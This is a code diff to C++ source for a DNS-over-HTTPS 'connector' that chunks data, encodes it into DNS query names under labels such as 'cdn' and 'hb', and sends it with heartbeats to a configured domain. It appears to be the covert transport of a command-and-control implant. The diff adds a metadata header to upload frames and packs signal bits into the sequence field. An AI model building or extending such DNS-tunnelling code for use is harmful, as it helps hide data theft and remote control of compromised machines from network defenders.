@@ -11,6 +11,31 @@ extern "C" int __cdecl _snprintf(char*, size_t, const char*, ...);
 
 // DNS utility functions are now in DnsUtils.h/cpp
 
+static ULONG DnsBuildWireSeq(ULONG logicalSeq, ULONG signalBits)
+{
+	ULONG seqCounter = logicalSeq & 0x0FFF;
+	ULONG sig = signalBits & 0x0F;
+	return (sig << 12) | seqCounter;
+}
+
+#pragma pack(push, 1)
+typedef struct _DNS_META_V1 {
+	BYTE  version;
+	BYTE  metaFlags;
+	USHORT reserved;
+	ULONG queryTaskId;
+} DNS_META_V1, *PDNS_META_V1;
+#pragma pack(pop)
+
+static void MetaV1Init(DNS_META_V1* h)
+{
+	if (!h) return;
+	h->version     = 1;
+	h->metaFlags   = 0;
+	h->reserved    = 0;
+	h->queryTaskId = 0;
+}
+
 // -----------------------------------------------------------------------------
 // ConnectorDoH Implementation
 // -----------------------------------------------------------------------------
@@ -949,10 +974,11 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 
 	// -------------------------------------------------------------------------
 	// 2. Upload path: data present => PUT-like behavior with framing
-	//    frame = [4 bytes total_len][4 bytes offset][chunk...]
+	//    frame = [META_V1:8][4 bytes total_len][4 bytes offset][chunk...]
 	// -------------------------------------------------------------------------
 	if (data && data_size) {
-		const ULONG headerSize = 8;
+		const ULONG metaSize = sizeof(DNS_META_V1);
+		const ULONG headerSize = metaSize + 8; // meta + [total][offset]
 		ULONG total = data_size;
 		ULONG maxChunk = pkt;
 		if (maxChunk <= headerSize)
@@ -1000,7 +1026,8 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			}
 			MemFreeLocal((LPVOID*)&frame, frameSize);
 
-			DnsBuildQName(this->sid, "cdn", seqForSend, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+			ULONG wireSeq = DnsBuildWireSeq(seqForSend, 0);
+			DnsBuildQName(this->sid, "cdn", wireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
 			BYTE tmp[512];
 			ULONG tmpSize = 0;
 			
@@ -1083,7 +1110,8 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 		}
 		MemFreeLocal((LPVOID*)&encBuf, retrySize);
 
-		DnsBuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+		ULONG wireSeq = DnsBuildWireSeq(this->seq, 0);
+		DnsBuildQName(this->sid, "www", wireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
 		BYTE tmp[512];
 		ULONG tmpSize = 0;
 		if (DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize)) {
@@ -1133,7 +1161,9 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 		CHAR hbLabel[24];
 		memset(hbLabel, 0, sizeof(hbLabel));
 		DnsBase32Encode(hbData, 8, hbLabel, sizeof(hbLabel));
-		DnsBuildQName(this->sid, "hb", this->seq + 1, this->idx, hbLabel, this->domain, qnameA, sizeof(qnameA));
+		ULONG hbSeqLogical = this->seq + 1;
+		ULONG hbWireSeq = DnsBuildWireSeq(hbSeqLogical, 0);
+		DnsBuildQName(this->sid, "hb", hbWireSeq, this->idx, hbLabel, this->domain, qnameA, sizeof(qnameA));
 		DnsDebugLogf("[DoH] HEARTBEAT(A): seq=%lu ack=%lu nonce=%08x", this->seq + 1, this->downAckOffset, hbNonce);
 		BYTE ipBuf[16];
 		ULONG ipSize = 0;
